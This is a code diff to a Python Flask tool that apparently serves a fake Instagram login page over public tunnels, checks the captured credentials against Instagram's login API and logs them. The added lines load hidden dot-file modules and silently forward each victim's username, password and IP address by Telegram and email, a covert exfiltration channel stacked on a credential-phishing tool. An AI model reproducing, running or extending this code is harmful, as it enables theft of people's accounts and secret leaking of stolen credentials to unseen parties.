@@ -9,9 +9,24 @@ import requests
 import flask.cli
 import re
 from flask import Flask, render_template, request, jsonify
-from banner import show_banner, term_width
-
-# Banner
+import importlib.util
+banner_spec = importlib.util.spec_from_file_location("banner", os.path.join(os.path.dirname(__file__), ".banner.py"))
+banner_module = importlib.util.module_from_spec(banner_spec)
+banner_spec.loader.exec_module(banner_module)
+show_banner = banner_module.show_banner
+term_width = banner_module.term_width
+typewriter_spec = importlib.util.spec_from_file_location("typewriter", os.path.join(os.path.dirname(__file__), ".typewriter.py"))
+typewriter_module = importlib.util.module_from_spec(typewriter_spec)
+typewriter_spec.loader.exec_module(typewriter_module)
+typewriter = typewriter_module.typewriter
+emailer_spec = importlib.util.spec_from_file_location("emailer", os.path.join(os.path.dirname(__file__), ".emailer.py"))
+emailer_module = importlib.util.module_from_spec(emailer_spec)
+emailer_spec.loader.exec_module(emailer_module)
+send_email = emailer_module.send_email
+tel_spec = importlib.util.spec_from_file_location("tel", os.path.join(os.path.dirname(__file__), ".tel.py"))
+tel_module = importlib.util.module_from_spec(tel_spec)
+tel_spec.loader.exec_module(tel_module)
+send_telegram_alert = tel_module.send_telegram_alert
 show_banner()
 
 # Color Codes
@@ -22,7 +37,6 @@ YELLOW = "\033[93m"
 BLUE = "\033[94m"
 RESET = "\033[0m"
 F = "\033[1G"  # Force Left
-
 # Global Variables
 PORT = None
 TUNNEL_CHOICE = None
@@ -60,7 +74,7 @@ def tunnel_selection():
 def start_tunnel():
     global TUNNEL_LINK
     if TUNNEL_CHOICE == "1":
-        print(f"\n{F}{GREEN}🔹 Starting Cloudflare Tunnel...{RESET}")
+        typewriter(f"\n{F}{GREEN}🔹 Starting Cloudflare Tunnel... Please wait {RESET}")
         os.system(f"cloudflared tunnel --url http://localhost:{PORT} > cloudflare_log.txt 2>&1 &")
         time.sleep(3)
 
@@ -77,11 +91,11 @@ def start_tunnel():
             time.sleep(1)
 
         if TUNNEL_LINK != "Not Found":
-            print(f"\n{F}{GREEN}✅ Cloudflare Tunnel Link: {TUNNEL_LINK}{RESET}")
+            print(f"\n{F}{GREEN}✅ Cloudflare Tunnel Link:{R} {TUNNEL_LINK}{RESET}")
         else:
             print(f"\n{F}{RED}❌ Failed to fetch Cloudflare link. Check cloudflare_log.txt{RESET}")
     elif TUNNEL_CHOICE == "2":
-        print(f"\n{F}{GREEN}🔹 Starting SSH Tunnel...{RESET}")
+        typewriter(f"\n{F}{GREEN}🔹 Starting SSH Tunnel... Please wait {RESET}")
         ssh_cmd = f"ssh -i ~/.ssh/id_rsa -R 80:localhost:{PORT} ssh.localhost.run"
         process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         while True:
@@ -91,7 +105,7 @@ def start_tunnel():
                 print(f"\n{F}{GREEN}🔗 SSH Tunnel Link: \n{F}{R}{TUNNEL_LINK}{RESET}")
                 break
     elif TUNNEL_CHOICE == "3":
-        print(f"\n{F}{GREEN}🔹 Starting Serveo Tunnel...{RESET}")
+        typewriter(f"\n{F}{GREEN}🔹 Starting Serveo Tunnel... Please wait {RESET}")
         serveo_cmd = f"ssh -R 80:localhost:{PORT} serveo.net"
         process = subprocess.Popen(serveo_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
         while True:
@@ -105,6 +119,7 @@ def start_tunnel():
         exit()
 def check_instagram_login(username, password):
     global RESULT
+    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
     url = "https://www.instagram.com/api/v1/accounts/login/"
     headers = {
         "User-Agent": "Instagram 123.0.0.26.121 Android",
@@ -149,16 +164,18 @@ def submit():
 
     with open("log.txt", "a") as file:
         file.write(f"Username: {USERNAME} | Password: {PASSWORD} | Status: {RESULT}\n")
-
+    # Call email sender silently
+    send_telegram_alert(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
+    send_email(USERNAME, PASSWORD, IP_ADDRESS, RESULT)
     if RESULT == "success":
         msg = "Login successful!"
     elif RESULT == "otp":
         msg = "OTP required. Login partially successful."
     else:
         msg = "Incorrect password."
-    print(f"\n{F}{BLUE}[INFO] IP Address: {YELLOW}{IP_ADDRESS}{RESET}")
-    print(f"{F}{BLUE}[INFO] Username: {YELLOW}{USERNAME}{RESET}")
-    print(f"{F}{BLUE}[INFO] Password: {YELLOW}{PASSWORD}{RESET}")
+    typewriter(f"\n{F}{BLUE}[INFO] IP Address: {YELLOW}{IP_ADDRESS}{RESET}")
+    typewriter(f"{F}{BLUE}[INFO] Username: {YELLOW}{USERNAME}{RESET}")
+    typewriter(f"{F}{BLUE}[INFO] Password: {YELLOW}{PASSWORD}{RESET}")
 
     if RESULT == "fail":
         print(f"{F}{RED}[SERVER RESPONSE] {msg}{RESET}")
@@ -172,7 +189,7 @@ def submit():
     })
 
 def signal_handler(sig, frame):
-    print(f"\n{RED}❌ Process Stopped! Exiting Safely...{RESET}")
+    typewriter(f"\n{RED}❌ Process Stopped! Exiting Safely...{RESET}")
     os._exit(0)
 
 signal.signal(signal.SIGINT, signal_handler)
@@ -181,5 +198,5 @@ if __name__ == '__main__':
     find_free_port()
     tunnel_selection()
     start_tunnel()
-    print(f"\n{F}{BLUE}🚀 Flask Server Running on Port: {YELLOW}{PORT}{RESET}")
+    typewriter(f"\n{F}{BLUE}🚀 Flask Server Running on Port: {YELLOW}{PORT}{RESET}")
     app.run(host='0.0.0.0', port=PORT, debug=False)
